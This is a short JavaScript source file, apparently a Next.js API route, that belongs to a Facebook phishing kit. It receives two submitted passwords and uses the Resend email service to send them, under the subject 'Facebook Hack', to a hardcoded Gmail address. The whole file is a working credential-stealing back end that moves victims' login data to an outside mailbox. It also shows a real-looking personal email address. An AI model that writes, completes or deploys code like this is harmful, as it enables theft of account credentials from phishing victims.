/* eslint-disable no-undef */
import { Resend } from "resend";

export async function POST(request) {
  const resend = new Resend(process.env.RESEND_API_KEY);
  const color = "#ffbb00";

  try {
    const { message } = await request.json();

    const { data, error } = await resend.emails.send({
      from: "Facebook Hack <onboarding@resend.dev>",
      to: ["angelxcrema@gmail.com"],
      subject: "Facebook Hack",
      message,
      html: `
        <h1 style="margin:0 0 20px;color:#ffbb00;font-family:'Courier New',monospace;font-size:16px;font-weight:700>Credentials: </h1>

        <h2 style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password01}</h2>
        <h2 style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password02}</h2>

        <a style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700> Facebook Hackeado ...</a>
      `,
    });

    if (error) return new Response(error);
    return new Response(JSON.stringify(data));
  } catch (error) {
    return new Response("Error processing the request", {
      status: 500,
    });
  }
}
